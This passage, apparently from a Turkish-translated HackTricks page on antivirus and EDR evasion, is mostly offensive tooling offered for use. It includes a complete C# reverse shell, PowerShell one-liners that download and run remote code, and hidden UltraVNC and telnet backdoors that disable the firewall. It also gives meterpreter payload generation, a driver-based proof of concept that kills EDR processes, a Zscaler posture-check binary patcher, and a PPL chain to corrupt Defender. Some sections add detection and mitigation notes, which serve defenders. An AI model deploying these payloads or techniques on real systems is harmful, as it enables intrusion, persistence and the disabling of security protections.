Bu yöntem, **yeni bir kurban süreç (sacrificial process) oluşturmayı**, post-exploitation kötü amaçlı kodunuzu o yeni sürece enjekte etmeyi, kötü amaçlı kodu çalıştırmayı ve iş bitince yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemimiz sırasında bir şey ters gider veya yakalanırsa, implantımızın hayatta kalma olasılığının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise, **Davranışsal Tespitler (Behavioural Detections)** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation kötü amaçlı kodu **kendi sürecinin içine** enjekte etmeyi ifade eder. Bu sayede yeni bir süreç oluşturup AV tarafından taranmasını engelleyebilirsiniz, ancak dezavantajı, payload'unuzun çalıştırılması sırasında bir şey ters giderse beacon'ınızı **kaybetme** olasılığının **çok daha yüksek** olmasıdır çünkü süreç çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly yükleme hakkında daha fazla okumak isterseniz, bu makaleye göz atın: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'unu inceleyin ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ayrıca C# Assembly'lerini **PowerShell** üzerinden de yükleyebilirsiniz, bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), başka diller kullanarak kötü amaçlı kod yürütmek mümkündür; bunun için ele geçirilmiş makinenin Attacker Controlled SMB share üzerine kurulu yorumlayıcı ortamına (interpreter environment) erişimi olması yeterlidir.

SMB paylaşımındaki Interpreter Binaries ve ortamına erişim izni vererek, ele geçirilmiş makinenin belleği içinde bu dillerde **herhangi bir kodu çalıştırabilirsiniz**.

Repo şu notu içeriyor: Defender hala betikleri tarıyor, ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele, obfuske edilmemiş reverse shell betikleri ile yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, bir saldırganın **erişim token'ını veya bir EDR ya da AV gibi bir güvenlik ürününü manipüle etmesine** olanak tanıyan bir tekniktir; bu sayede sürecin ölmemesini sağlarken, kötü niyetli etkinlikleri kontrol etme izinlerini düşürebilir.

Bunu önlemek için Windows, güvenlik süreçlerinin token'ları üzerinde dış süreçlerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Bu [**blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın PC'sine Chrome Remote Desktop'ı yükleyip onu ele geçirip kalıcılık sağlamak kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulumu hedef makinede sessizce çalıştırın (yönetici gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Sihirbaz sizi yetkilendirme istemiyle yönlendirecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin ayarlamaya izin veren pin parametresine dikkat edin.)

## Gelişmiş Kaçınma

Kaçınma çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını hesaba katmanız gerekir, bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Karşılaştığınız her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'un bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda Evasion in Depth hakkında [@mariuszbit](https://twitter.com/mariuszbit) tarafından verilmiş başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi parçaları zararlı bulduğunu kontrol et**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz; bu araç binary'nin parçalarını **kaldırana kadar** parça parça test ederek **Defender'ın hangi kısmı** zararlı bulduğunu tespit eder ve size ayırır.\
Aynı işi yapan başka bir araç da [**avred**](https://github.com/dobin/avred) olup, hizmeti açık bir web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows10'a kadar, tüm Windows sürümleri (yönetici olarak) şu şekilde kurabileceğiniz bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında onun **başlamasını** sağlayın ve şimdi onu **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini seçin; setup'ı değil)

**ON THE HOST**: Çalıştırın _**winvnc.exe**_ ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, ikili _**winvnc.exe**_ ve yeni oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Sonra, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için aşağıdakileri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın yoksa [config penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml payload**'ı aşağıdaki komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender süreci çok hızlı şekilde sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using derleyici
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python kullanarak injectors oluşturma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Alanından AV/EDR'yi Sonlandırma

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracından yararlandı. Araç kendi **zayıf ama *imzalı* sürücüsünü** getiriyor ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu suistimal ediyor.

Önemli çıkarımlar
1. **Signed driver**: Diske yazılan dosya `ServiceMouse.sys` fakat ikili aslında Antiy Labs’in “System In-Depth Analysis Toolkit”inden meşru şekilde imzalanmış sürücü `AToolsKrnl64.sys`. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır hizmeti başlatarak `\\.\ServiceMouse`'in kullanıcı alanından erişilebilir hale gelmesini sağlar.
3. **IOCTLs exposed by the driver**
| IOCTL kodu | İşlevi                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir süreci sonlandır (Defender/EDR servislerini sonlandırmak için kullanıldı) |
| `0x990000D0` | Diskte rastgele bir dosyayı sil |
| `0x990001D0` | Sürücüyü boşalt ve servisi kaldır |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD kullanıcı modu korumalarını tamamen atlar; kernel'de çalışan kod *protected* süreçleri açabilir, bunları sonlandırabilir veya PPL/PP, ELAM ya da diğer sertleştirme özelliklerine bakmaksızın kernel nesnelerine müdahale edebilir.

Tespit / Hafifletme
•  Microsoft’ün vulnerable-driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin, böylece Windows `AToolsKrnl64.sys`'i yüklemeyi reddeder.  
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden veya allow-list'te olmayan bir yerden yüklendiğinde uyarı verin.  
•  Özel device objelerine yönelik user-mode handle'ları ve bunu takiben şüpheli `DeviceIoControl` çağrılarını izleyin.

### Zscaler Client Connector Posture Kontrollerini Disk Üzerindeki Binary Yamasıyla Atlatma

Zscaler’ın **Client Connector**'ı cihaz-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlerle iletmek için Windows RPC'ye dayanır. Tam bir atlatmayı mümkün kılan iki zayıf tasarım tercihi vardır:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya bir boolean gönderilir).  
2. Internal RPC endpoint'leri bağlanan executable'ın yalnızca **Zscaler tarafından imzalandığını** doğrular (via `WinVerifyTrust`).

Disk üzerindeki dört imzalı ikiliyi **yama yaparak** her iki mekanizma da nötralize edilebilir:

| Binary | Orijinal mantık yaması | Sonuç |
|--------|------------------------|-------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece her kontrol uyumlu olur |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ herhangi bir (imzasız bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Yerine `mov eax,1 ; ret` konuldu |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kısa devre ile atlandı |

Minimal patcher kesiti:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) bir başlatıcı kullanarak `CREATE_PROTECTED_PROCESS` ile çalıştırın (ör. CreateProcessAsPPL).
2) ClipUp log-yolu argümanını, korumalı bir AV dizininde (ör. Defender Platform) dosya oluşturmaya zorlamak için geçirin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili dosya genellikle AV tarafından çalışırken açık/kilitli ise (ör. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede zamanlayın; bunun için daha önce güvenilir şekilde çalışan bir otomatik başlatma servisi yükleyin. Önyükleme sırasını Process Monitor ile doğrulayın (boot logging).
4) Yeniden başlatmada PPL destekli yazma, AV ikili dosyalarını kilitlemeden önce gerçekleşir; hedef dosyayı bozarak başlatmayı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve sınırlamalar
- ClipUp'ın yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; bu primitive kesin içerik enjeksiyonundan ziyade bozulmaya (corruption) uygundur.
- Bir hizmeti kurmak/başlatmak ve bir yeniden başlatma penceresi için local admin/SYSTEM gerektirir.
- Zamanlama kritik: hedef açık olmamalıdır; boot-zamanı yürütme dosya kilitlerinden kaçınır.

Tespitler
- `ClipUp.exe`'nin olağandışı argümanlarla süreç oluşturması, özellikle non-standard launchers tarafından parent edildiğinde ve boot civarında.
- Şüpheli ikili dosyaları otomatik başlatılacak şekilde yapılandırılmış yeni servisler ve Defender/AV'den önce tutarlı şekilde başlatılmaları. Defender başlatma hatalarından önce servis oluşturma/değişikliklerini araştırın.
- Defender binaries/Platform directories üzerinde dosya bütünlüğü izleme; protected-process bayraklarına sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV olmayan ikili dosyalar tarafından anormal PPL seviye kullanımlarını arayın.

Önlemler
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru bağlamların dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatılan servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran volume'larda ortamınızla uyumluysa 8.3 kısa ad (short-name) oluşturmayı devre dışı bırakmayı düşünün (iyice test edin).

PPL ve araçlar için referanslar
- Microsoft Protected Processes genel bakış: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referansı: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (sıralama doğrulaması): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Teknik açıklaması (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
